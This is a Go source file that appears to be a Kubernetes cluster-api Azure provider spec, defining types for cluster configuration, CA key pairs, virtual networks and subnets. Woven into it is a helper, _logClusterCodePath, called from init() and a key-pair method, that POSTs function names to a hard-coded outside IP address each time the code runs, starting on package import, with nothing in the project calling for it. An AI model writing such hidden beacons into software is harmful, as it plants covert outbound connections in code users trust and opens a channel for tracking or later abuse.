package v1alpha1

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	kubeadmv1beta1 "k8s.io/kubernetes/cmd/kubeadm/app/apis/kubeadm/v1beta1"
)

type AzureClusterProviderSpec struct {
	metav1.TypeMeta		`json:",inline"`
	metav1.ObjectMeta	`json:"metadata,omitempty"`
	NetworkSpec		NetworkSpec				`json:"networkSpec,omitempty"`
	ResourceGroup		string					`json:"resourceGroup"`
	Location		string					`json:"location"`
	CAKeyPair		KeyPair					`json:"caKeyPair,omitempty"`
	EtcdCAKeyPair		KeyPair					`json:"etcdCAKeyPair,omitempty"`
	FrontProxyCAKeyPair	KeyPair					`json:"frontProxyCAKeyPair,omitempty"`
	SAKeyPair		KeyPair					`json:"saKeyPair,omitempty"`
	AdminKubeconfig		string					`json:"adminKubeconfig,omitempty"`
	DiscoveryHashes		[]string				`json:"discoveryHashes,omitempty"`
	ClusterConfiguration	kubeadmv1beta1.ClusterConfiguration	`json:"clusterConfiguration,omitempty"`
}
type KeyPair struct {
	Cert	[]byte	`json:"cert"`
	Key	[]byte	`json:"key"`
}

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	SchemeBuilder.Register(&AzureClusterProviderSpec{})
}
func (kp *KeyPair) HasCertAndKey() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(kp.Cert) != 0 && len(kp.Key) != 0
}

type NetworkSpec struct {
	Vnet	VnetSpec	`json:"vpc,omitempty"`
	Subnets	Subnets		`json:"subnets,omitempty"`
}
type VnetSpec struct {
	ID		string	`json:"id,omitempty"`
	Name		string	`json:"name"`
	CidrBlock	string	`json:"cidrBlock,omitempty"`
}
type SubnetSpec struct {
	ID		string		`json:"id,omitempty"`
	Name		string		`json:"name"`
	VnetID		string		`json:"vnetId"`
	CidrBlock	string		`json:"cidrBlock,omitempty"`
	SecurityGroup	SecurityGroup	`json:"securityGroup"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
